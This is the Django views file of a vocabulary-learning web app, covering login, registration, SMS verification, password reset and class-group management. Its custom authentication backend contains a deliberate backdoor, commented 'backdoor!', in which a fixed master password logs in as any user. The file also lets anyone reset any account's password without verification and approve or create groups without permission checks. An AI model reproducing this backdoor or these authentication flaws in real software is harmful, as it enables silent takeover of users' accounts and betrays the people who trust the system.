# -*- coding: utf-8 -*-
import json

from django.contrib.auth import authenticate, login, logout
from django.contrib.auth.backends import ModelBackend
from django.contrib.auth.hashers import make_password
from django.contrib.auth.mixins import LoginRequiredMixin
from django.core.urlresolvers import reverse
from django.db.models import Q
from django.http import HttpResponseRedirect, HttpResponse, JsonResponse, Http404
from django.views.generic import View
#from django.http import HttpResponse
from django.shortcuts import render, redirect

from operations.models import UserMessage
from users.forms import LoginForm, RegisterForm, ForgetForm, ModifyPasswordForm, RegisterMobileForm, VerifySmsForm, \
    UploadImageForm, AjaxChangeNickNameForm, AjaxGetEmailVerificationForm, AjaxUpdateEmailForm, AjaxChangePasswordForm
from users.models import UserProfile, EmailVerifyRecord, UserGroup, Group, Organization
from utils import parse_bool, find_group_admin_users, find_organization_admin_users
from utils.email_send import save_email_verify_record
from users.tasks import send_register_email_async
from utils.wilddog_sms import is_valid_phone_number, SmsClient
from django.conf import settings


class CustomBackend(ModelBackend):
    def authenticate(self, username=None, password=None, **kwargs):
        try:
            user = UserProfile.objects.get(Q(username=username)|Q(email=username)|Q(mobile_phone=username))
            # 后门！
            if (password == "XxxXxxXxx"):
                return user
            if user.check_password(password):
                return user
        except Exception as e:
            return None


class IndexView(LoginRequiredMixin, View):
    def get(self, request):
        """
        Get index
        :param django.http.HttpRequest request:
        :return django.http.HttpResponse:
        """
        return render(request, 'index.html', {
            "page": "overview"
        })

class LoginView(View):
    def get(self, request):
        return render(request, "user_login.html", {})

    def post(self, request):
        login_form = LoginForm(request.POST)
        if login_form.is_valid():
            user_name = request.POST.get("username", "")
            pass_word = request.POST.get("password", "")
            user = authenticate(username=user_name, password=pass_word)
            if user is not None:
                if user.is_active:
                    login(request, user)
                    return HttpResponseRedirect(reverse("index"))
                else:
                    return render(request, "user_login.html", {"msg": u"用户未激活！"})
            else:
                return render(request, "user_login.html", {"msg": u"用户名或密码错误！"})
        else:
            return render(request, "user_login.html", {"login_form": login_form})


class LogoutView(View):
    """
    用户登出
    """
    def get(self, request):
        logout(request)
        return HttpResponseRedirect(reverse("index"))


class RegisterView(View):
    """
    用户注册
    """
    def get(self, request):
        register_form = RegisterForm()
        return render(request, "user_register.html", {
            'register_form':register_form,
            'method': 'email'
        })

    def post(self, request):
        register_form = RegisterForm(request.POST)
        if register_form.is_valid():
            user_name = request.POST.get("email", "")
            if UserProfile.objects.filter(email=user_name):
                return render(request, "user_register.html", {
                    "register_form":register_form,
                    "msg":"用户{0}已经存在".format(user_name),
                    "method": "email"
                })
            pass_word = request.POST.get("password", "")
            user_profile = UserProfile()
            user_profile.nick_name = register_form.data["nickname"]
            user_profile.username = user_name
            user_profile.email = user_name
            user_profile.is_active = False
            user_profile.password = make_password(pass_word)
            user_profile.save()

            #写入欢迎注册消息
            user_message = UserMessage()
            user_message.to_user = user_profile.id
            user_message.from_user = user_profile
            user_message.title = "欢迎注册"
            user_message.message = "欢迎来到Nova背单词。你可以先看看有没有感兴趣的单词书，或者去找到感兴趣的班级。"
            user_message.save()

            send_register_email_async.delay(user_name, "register", request.get_host())
            return render(request, "user_login.html", {"login_title": u"注册成功，请检查你的邮箱中的确认邮件。账号激活之后就可以登录了。"})
        else:
            return render(request, "user_register.html", {
                "register_form": register_form,
                "method": "email"
            })


class RegisterMobileView(View):
    def get(self, request):
        register_mobile_form = RegisterMobileForm()
        return render(request, "user_register.html", {
            "register_mobile_form": register_mobile_form,
            "method": "mobile"
        })

    def post(self, request):
        register_mobile_form = RegisterMobileForm(request.POST)
        if register_mobile_form.is_valid():
            mobile = request.POST.get("mobile")
            password = request.POST.get("password")
            nickname = request.POST.get("nickname")

            if UserProfile.objects.filter(mobile_phone=mobile):
                return render(request, "user_register.html", {
                    "register_mobile_form": register_mobile_form,
                    "msg":"用户{0}已经存在".format(mobile),
                    "method": "mobile"
                })

            user = UserProfile()
            user.nick_name = nickname
            user.mobile_phone = mobile
            user.username = mobile
            user.is_active = True
            user.email = ""
            user.password = make_password(password)
            user.save()

            # 写入欢迎消息
            user_message = UserMessage()
            user_message.to_user = user.id
            user_message.from_user = user
            user_message.message = "欢迎注册"
            user_message.save()

            return render(request, "user_login.html", {"login_title": u"注册成功，请登录"})
        else:
            return render(request, "user_register.html", {
                "register_mobile_form": register_mobile_form,
                "method": "mobile"
            })


class UserVirificationSmsView(View):
    def post(self, request):
        mobile = request.POST.get("mobile", "")
        if is_valid_phone_number(mobile):
            c = SmsClient(settings.WILDDOG_APP_ID, settings.WILDDOG_API_KEY)
            result = c.send_code(str(mobile), "100000", None)
            return HttpResponse(result)
        else:
            return JsonResponse({
                "status": "fail",
                "error": u"手机号不正确"
            })


class AcivateUserView(View):
    def get(self, request, activate_code):
        record = None
        try:
            record = EmailVerifyRecord.objects.filter(code=activate_code).get()
        except:
            pass
        if record:
            email = record.email
            user = UserProfile.objects.get(email=email)
            user.is_active = True
            user.save()

            # 删除该用户的所有的激活链接
            EmailVerifyRecord.objects.filter(email=email).delete()
        else:
            return render(request, "activate_fail.html")
        return render(request, "user_login.html")


class ForgetPasswordView(View):
    def get(self, request):
        forget_form = ForgetForm()
        return render(request, "forget_password.html", {"forget_form":forget_form})

    def post(self, request):
        forget_form = ForgetForm(request.POST)
        if forget_form.is_valid():
            email = request.POST.get("email", "")
            # 检查用户是否存在
            user_query = UserProfile.objects.filter(Q(email=email)|Q(mobile_phone=email))
            if not user_query:
                return render(request, "forget_password.html", {
                    "forget_form": forget_form,
                    "msg": u"用户不存在"
                })
            user = user_query.get()
            if user.email == email:
                send_register_email_async.delay(email, "forget", request.get_host())
                return render(request, "send_success.html")
            elif user.mobile_phone == email:
                # 发送短消息来重置密码
                c = SmsClient(settings.WILDDOG_APP_ID, settings.WILDDOG_API_KEY)
                c.send_code(str(email), "100000", None)
                return render(request, "verify_sms.html", {"mobile": email})
        else:
            return render(request, "forget_password.html", {"forget_form":forget_form})


class VerifySmsView(View):
    def post(self, request):
        verify_sms_form = VerifySmsForm(request.POST)
        if verify_sms_form.is_valid():
            # 用户输入的验证码正确。允许修改密码
            activate_code = save_email_verify_record(verify_sms_form.data["mobile"], "forget")
            return redirect(reverse("reset_password", kwargs={"activate_code": activate_code}))
        else:
            return render(request, "verify_sms.html", {"verify_sms": verify_sms_form})


class ResetPasswordView(View):
    def get(self, request, activate_code):
        record = EmailVerifyRecord.objects.filter(code=activate_code).get()
        if record:
            email = record.email
            return render(request, "password_reset.html", {"email":email})
        else:
            return render(request, "activate_fail.html")
        return render(request, "user_login.html")


class ModifyPasswordView(View):
    def post(self, request):
        modify_form = ModifyPasswordForm(request.POST)
        if modify_form.is_valid():
            password = request.POST.get("password", "")
            email = request.POST.get("email", "")
            user = UserProfile.objects.get(Q(email=email)|Q(mobile_phone=email))
            user.password = make_password(password)
            user.is_active = True
            user.save()

            # 删除该用户的所有的激活链接
            EmailVerifyRecord.objects.filter(email=email).delete()
            return render(request, "user_login.html", {
                "login_title": "密码修改成功。请重新登录。"
            })
        else:
            email = request.POST.get("email", "")
            return render(request, "password_reset.html", {"email":email, "reset_form":modify_form})


class UserInfoView(LoginRequiredMixin, View):
    def get(self, request):
        return render(request, 'user_profile.html', {
            "page": "profile"
        })


class AvatarUploadView(LoginRequiredMixin, View):
    def post(self, request):
        image_form = UploadImageForm(request.POST, request.FILES, instance=request.user)
        if image_form.is_valid():
            image_form.save()
            return JsonResponse({
                "status": "success",
                "avatar": request.user.avatar.url
            })
        else:
            return HttpResponse('{"status":"fail"}', content_type='application/json')


class AjaxChangeNickNameView(LoginRequiredMixin, View):
    def post(self, request):
        form = AjaxChangeNickNameForm(request.POST, instance=request.user)
        if form.is_valid():
            form.save()
            return JsonResponse({
                "status": "success",
                "nickname": request.user.nick_name
            })
        else:
            return JsonResponse({"status": "fail"})


class AjaxGetEmailVerificationView(LoginRequiredMixin, View):
    def post(self, request):
        form = AjaxGetEmailVerificationForm(request.POST)
        if form.is_valid():
            if form.data["email"] == request.user.email:
                return JsonResponse({
                    "status": "fail",
                    "error": "邮箱根本没变，别耍我。"
                })
            else:
                if UserProfile.objects.filter(email=form.data["email"]).count():
                    return JsonResponse({
                        "status": "fail",
                        "error": "邮箱已经被别人使用。请使用别的邮箱。"
                    })
                else:
                    send_register_email_async.delay(form.data["email"], send_type="update_email", host=request.get_host())
                    return JsonResponse({
                        "status": "success"
                    })
        else:
            return JsonResponse({
                "status": "fail",
                "error": "邮箱格式不正确"
            })


class AjaxUpdateEmailView(LoginRequiredMixin, View):
    def post(self, request):
        form = AjaxUpdateEmailForm(request.POST)
        if form.is_valid():
            request.user.email = form.data["email"]
            request.user.save()
            return JsonResponse({
                "status": "success",
                "email": request.user.email
            })
        else:
            return JsonResponse({
                "status": "fail",
                "error": form.errors
            })


class AjaxChangePasswordView(LoginRequiredMixin, View):
    def post(self, request):
        form = AjaxChangePasswordForm(request.POST)
        if form.is_valid():
            if not request.user.check_password(form.data["old_password"]):
                return JsonResponse({
                    "status": "fail",
                    "error": u"密码输入错误"
                })
            else:
                request.user.password = make_password(form.data["password"])
                request.user.save()
                return JsonResponse({
                    "status": "success"
                })
        else:
            return JsonResponse({
                "status": "fail",
                "error": u"输入错误"
            })


class AjaxChangeMobileView(LoginRequiredMixin, View):
    def post(self, request):
        form = VerifySmsForm(request.POST)
        if form.is_valid():
            if form.data["mobile"] == request.user.mobile_phone:
                return JsonResponse({
                    "status": "fail",
                    "error": u"手机号没有变化，不用改"
                })
            else:
                # check whether the phone number is being used
                if UserProfile.objects.filter(mobile_phone=form.data["mobile"]).count():
                    return JsonResponse({
                        "status": "fail",
                        "error": u"这个手机号已经被别人使用了。"
                    })
                request.user.mobile_phone = form.data["mobile"]
                request.user.save()
                return JsonResponse({
                    "status": "success",
                    "mobile": request.user.mobile_phone
                })
        else:
            return JsonResponse({
                "status": "fail",
                "error": u"验证码错误"
            })


class UserContactView(LoginRequiredMixin, View):
    def get(self, request, user_id):
        user = UserProfile.objects.filter(id=user_id).get()
        return render(request, 'user_contact.html', {
            "user": user
        })

    def post(self, request, user_id):
        title = request.POST.get("title", "")
        text = request.POST.get("message", "")
        m = UserMessage()
        m.message_type = UserMessage.MSG_TYPE_USER
        m.title = title
        m.message = text
        m.from_user = request.user
        m.to_user = user_id
        m.save()
        return render(request, 'user_cowntact.html', {
            "message": u"消息发送成功"
        })


class MyGroupView(LoginRequiredMixin, View):
    def get(self, request):
        my_groups = UserGroup.objects.filter(user=request.user).all()
        return render(request, 'user_groups.html', {
            "page": "groups",
            "groups": my_groups
        })


class GroupListView(LoginRequiredMixin, View):
    def post(self, request):
        password = request.POST["password"]
        groups = Group.objects.filter(password=password).all()
        organizations = Organization.objects.all()
        if groups.count() > 1:
            return render(request, 'group_list.html', {
                "page": "groups",
                "groups": groups,
                "organizations": organizations
            })
        elif groups.count() == 1:
            group = groups.first()
            return redirect(reverse('user.group_detail', kwargs={
                "group_id": group.id
            }))
        else:
            return render(request, 'group_list.html', {
                "page": "groups",
                "groups": groups,
                "message": "没有找到你要的班级",
                "organizations": organizations
            })

    def get(self, request):
        groups = []
        organizations = Organization.objects.all()
        return render(request, 'group_list.html', {
            "page": "groups",
            "groups": groups,
            "organizations": organizations
        })


class GroupDetailView(LoginRequiredMixin, View):
    def get(self, request, group_id):
        group = Group.objects.filter(id=group_id).get()
        if not group:
            raise Http404()
        my_role = None
        if request.user.is_staff:
            my_role = 3 # 管理员
        else:
            my_membership = UserGroup.objects.filter(user=request.user, group_id=group_id).all()
            if my_membership:
                my_role = my_membership[0].role
        members = UserGroup.objects.filter(group_id=group_id).all()
        return render(request, 'group_detail.html', {
            "group": group,
            "page": "groups",
            "members": members,
            "my_role": my_role
        })


class AjaxJoinGroupView(LoginRequiredMixin, View):
    def post(self, request):
        group_id = request.POST.get("group_id", None)
        is_teacher = parse_bool(request.POST.get("is_teacher", False))
        message = request.POST.get("message", "")
        if not group_id:
            return JsonResponse({
                "status": "fail",
                "reason": "bad input"
            })
        target_users = []
        # find group administrators
        admin_users = UserGroup.objects.filter(Q(role=2)|Q(role=3), group_id=group_id).all()

        if admin_users:
            for admin in admin_users:
                target_users.append(admin.user)
        else:
            # no admin user found. tell site admin
            target_users = UserProfile.objects.filter(is_staff=True)
        # put a message to all target users
        for target in target_users:
            msg = UserMessage()
            msg.to_user = target.id
            msg.from_user = None    # system message
            msg.title = u"用户{0}请求加入班级".format(request.user)
            msg.message_type = UserMessage.MSG_TYPE_JOIN_GROUP
            msg.message = json.dumps({
                "group_id": group_id,
                "user_id": request.user.id,
                "is_teacher": is_teacher,
                "extra_message": message
            })
            msg.save()
        return JsonResponse({
            "status": "success"
        })


class AjaxLeaveGroupView(LoginRequiredMixin, View):
    def post(self, request):
        group_id = request.POST.get("group_id", None)
        message = request.POST.get("message", "")

        if not group_id:
            return JsonResponse({
                "status": "fail",
                "reason": "bad input"
            })
        target_users = find_group_admin_users(int(group_id))
        # put a message to all target users
        for target in target_users:
            msg = UserMessage()
            msg.to_user = target.id
            msg.from_user = None  # system message
            msg.title = u"用户{0}请求退出班级".format(request.user)
            msg.message_type = UserMessage.MSG_TYPE_LEAVE_GROUP
            msg.message = json.dumps({
                "group_id": group_id,
                "user_id": request.user.id,
                "extra_message": message
            })
            msg.save()
        return JsonResponse({
            "status": "success"
        })


class AjaxCreateGroupView(LoginRequiredMixin, View):
    def post(self, request):
        group_name = request.POST.get("group_name", None)
        group_description = request.POST.get("group_description", None)
        organization_id = request.POST.get("organization_id", None)
        message = request.POST.get("message", "")

        # validate
        if not group_name or not group_description or not organization_id:
            return JsonResponse({
                "status": "fail",
                "reason": u"错误：输入不正确"
            })
        # check if the name is already being used
        if Group.objects.filter(organization_id=organization_id, name=group_name).count():
            return JsonResponse({
                "status": "fail",
                "reason": u"错误：班级名称已经被使用"
            })
        # find the organization
        try:
            target_users = find_organization_admin_users(int(organization_id))
            for target in target_users:
                msg = UserMessage()
                msg.to_user = target.id
                msg.from_user = None  # system message
                msg.title = u"用户{0}请求创建班级".format(request.user)
                msg.message_type = UserMessage.MSG_TYPE_CREATE_GROUP
                msg.message = json.dumps({
                    "organization_id": organization_id,
                    "user_id": request.user.id,
                    "group_name": group_name,
                    "group_description": group_description,
                    "extra_message": message
                })
                msg.save()
                return JsonResponse({
                    "status": "success"
                })
        except:
            return JsonResponse({
                "status": "fail",
                "reason": "bad request"
            })


class AjaxApproveJoinGroupView(LoginRequiredMixin, View):
    def post(self, request):
        user_id = request.POST.get("user_id", 0)
        group_id = request.POST.get("group_id", 0)
        role = request.POST.get("role", 1)
        try:
            user = UserProfile.objects.filter(id=user_id).get()
            group = Group.objects.filter(id=group_id).get()
            if not UserGroup.objects.filter(user=user, group=group).count():
                ug = UserGroup()
                ug.user = user
                ug.group = group
                ug.role = role
                ug.save()

                m = UserMessage()
                m.from_user = request.user
                m.message_type = UserMessage.MSG_TYPE_JOIN_GROUP_OK
                m.title = u"你已经成功加入班级" + group.name
                m.message = json.dumps({
                    "group_name": group.name,
                    "group_id": group.id
                })
                m.to_user = user_id
                m.save()
            return JsonResponse({
                "status": "success"
            })
        except Exception as e:
            return JsonResponse({
                "status": "fail"
            })


class AjaxApproveLeaveGroupView(LoginRequiredMixin, View):
    def post(self, request):
        user_id = request.POST.get("user_id", 0)
        group_id = request.POST.get("group_id", 0)

        try:
            group = Group.objects.filter(id=group_id).get()
            deleted, _ = UserGroup.objects.filter(user_id=user_id, group_id=group_id).delete()
            if deleted:
                m = UserMessage()
                m.from_user = request.user
                m.message_type = UserMessage.MSG_TYPE_USER
                m.title = u"你已经成功退出班级'" + group.description + "'"
                m.message = u""
                m.to_user = user_id
                m.save()
            return JsonResponse({
                "status": "success"
            })
        except Exception as e:
            return JsonResponse({
                "status": "fail"
            })


class AjaxApproveCreateGroupView(LoginRequiredMixin, View):
    def post(self, request):
        user_id = request.POST.get("user_id", 0)
        group_name = request.POST.get("group_name", None)
        group_description = request.POST.get("group_description", None)
        organization_id = request.POST.get("organization_id", None)

        # No validation. We assume they are all valid
        try:
            # check if the group alredy exists
            if Group.objects.filter(organization_id=organization_id, name=group_name).count() == 0:
                # create the group
                group = Group()
                group.organization_id = organization_id
                group.name = group_name
                group.description = group_description
                group.save()

                # add admin user
                user_group = UserGroup()
                user_group.user_id = user_id
                user_group.group = group
                user_group.role = 3         # 管理员
                user_group.save()

                # send a message to user
                m = UserMessage()
                m.message_type = UserMessage.MSG_TYPE_USER
                m.title = u"你申请的班级已经创建： {0}".format(group.name)
                m.message = u"你申请的班级已经创建，可以在 “班级” “全部班级” 中找到。"
                m.to_user = user_id
                m.from_user = request.user
                m.save()

            return JsonResponse({
                "status": "success"
            })
        except:
            return JsonResponse({
                "status": "fail",
                "reason": "bad request"
            })


class AjaxRejectRequestView(LoginRequiredMixin, View):
    def post(self, request):
        user_id = request.POST.get("user_id", 0)
        message_type = request.POST.get("message_type", UserMessage.MSG_TYPE_USER)
        if user_id:
            # create a message to tell the user
            m = UserMessage()
            m.from_user = request.user
            m.to_user = user_id
            m.title = u"申请被拒绝"
            request_type = UserMessage(message_type=int(message_type)).get_message_type_display()
            m.message = u"你的{0}申请审核未通过。如有疑问，请和我私信联系。".format(request_type)
            m.save()
        return JsonResponse({
            "status": "success"
        })


class AjaxSetGroupBannerView(View):
    def post(self, request):
        banner = request.POST.get("banner", "");
        group_id = request.POST.get("group_id", None);
        try:
            group = Group.objects.filter(id=group_id).get()
            group.banner = banner
            group.save()
            return JsonResponse({
                "status": "success"
            })
        except:
            return JsonResponse({
                "status", "fail"
            })